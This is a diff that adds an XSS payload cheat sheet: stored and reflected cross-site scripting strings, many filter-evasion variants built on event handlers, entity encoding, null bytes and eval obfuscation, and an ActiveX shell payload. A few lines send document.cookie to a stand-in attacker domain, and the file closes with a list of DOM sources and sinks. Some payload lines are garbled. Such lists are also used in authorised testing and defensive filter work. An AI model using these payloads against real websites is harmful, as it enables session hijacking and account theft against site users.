@@ -1,0 +1,106 @@
+# Remember to encode every single input!
+
+Stored XSS:
+%<script>3cscript%<script>3ealert(1)%<script>3c/script%<script>3e
+
+Refleceted XSS:
+var i=new Image; i.src=”http://hackerdomain.com/”+document.cookie; ou open(”http://hackerdomain.com/”+document.cookie);
+
+Browser "TrustedZones" Payload:
+<script> var o = new ActiveXObject(‘WScript.shell’); o.Run(‘calc.exe’);</script>
+
+Bypass Filters:
+selselectect <scr<script>ipt> alert(1);</scr</script>ipt>
+“><script>alert(document.cookie)</script>
+<script<{alert(1)}/></script>
+“ onfocus=”alert(1)
+<script>eval(‘al’+’ert(1)’);</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));</script>
+<script>eval(atob(‘amF2YXNjcmlwdDphbGVydCgxKQ’));</script>
+<a href=#javascript:alert(1);></a>
+#”onclick=”javascript:alert(1)
+<script/randomtextaftertag>alert(1)</script>
+<<script>alert(1);//<</script>
+document.write('<iMg onerror=alert(1) src=a>')
+<[%00]img onerror=alert(1) src=a>
+<i[%00]mg onerror=alert(1) src=a>
+%E2%80%9C%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+“><script >alert(document.cookie)</script >
+“><ScRiPt>alert(document.cookie)</ScRiPt>
+“%3e%3cscript%3ealert(document.cookie)%3c/script%3e
+“><scr<script>ipt>alert(document.cookie)</scr</script>ipt>
+%00“><script>alert(document.cookie)</script>
+<xml onreadystatechange=alert(1)>
+<script>eval(‘a\l\ert\(1\)’);</script>
+<script>’alert(1)’.replace(/.+/,eval)</script>
+<script>function::[‘alert’](1)</script>
+<style onreadystatechange=alert(1)>
+<iframe onreadystatechange=alert(1)>
+<object onerror=alert(1)>
+<object type=image src=valid.gif onreadystatechange=alert(1)></object>
+<img type=image src=valid.gif onreadystatechange=alert(1)>
+<input type=image src=valid.gif onreadystatechange=alert(1)>
+<isindex type=image src=valid.gif onreadystatechange=alert(1)>
+<script onreadystatechange=alert(1)>
+<bgsound onpropertychange=alert(1)>
+<body onbeforeactivate=alert(1)>
+<body onactivate=alert(1)>
+<body onfocusin=alert(1)>
+<input autofocus onfocus=alert(1)>
+<input onblur=alert(1) autofocus><input autofocus>
+<body onscroll=alert(1)><br><br>...<br><input autofocus>
+</a onmousemove=alert(1)>
+<video src=1 onerror=alert(1)>
+<audio src=1 onerror=alert(1)>
+<object data=javascript:alert(1)>
+<iframe src=javascript:alert(1)>
+<img/onerror=alert(1) src=a>
+<img[%09]onerror=alert(1) src=a>
+<img[%0d]onerror=alert(1) src=a>
+<img[%0a]onerror=alert(1) src=a>
+<img/”onerror=alert(1) src=a>
+<img/’onerror=alert(1) src=a>
+<img/anyjunk/onerror=alert(1) src=a>
+<x onclick=alert(1) src=a>Click here</x>
+<img o[%00]nerror=alert(1) src=a>
+<img onerror=”alert(1)”src=a>
+<img onerror=’alert(1)’src=a>
+<img onerror=`alert(1)`src=a>
+<img src=`a`onerror=alert(1)>
+<img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&#x29;&#x27;&#x29; src=a>
+open(“//a/”+document.cookie)
+<script src=http://a></script>
+<script>eval(unescape(location))
+</script>#%0Aalert(‘long script here ......’)
+<script>alert(document[‘cookie’])</script>
+<script>with(document)alert(cookie)</script>
+<img onerror=eval(‘al&#x5c;u0065rt(1)’) src=a>
+<img/onerror=”alert(1)”src=a>
+<img onerror=a[%00]lert(1) src=a>
+<img onerror=a&#x6c;ert(1) src=a>
+<img onerror=a&#x06c;ert(1) src=a>
+<img onerror=a&#x006c;ert(1) src=a>
+<img onerror=a&#x0006c;ert(1) src=a>
+<img onerror=a&#108;ert(1) src=a>
+<img onerror=a&#0108;ert(1) src=a>
+<img onerror=a&#108ert(1) src=a>
+<img onerror=a&#0108ert(1) src=a>
+«img onerror=alert(1) src=a»
+
+“<script>alert(1)</script>
+“;alert(1)//
+‘-alert(1)-’
+
+document.location
+document.URL
+document.URLUnencoded
+document.referrer
+window.location
+document.cookie
+document.write()
+document.writeln()
+document.body.innerHtml
+eval()
+window.execScript()
+window.setInterval()
+window.setTimeout()
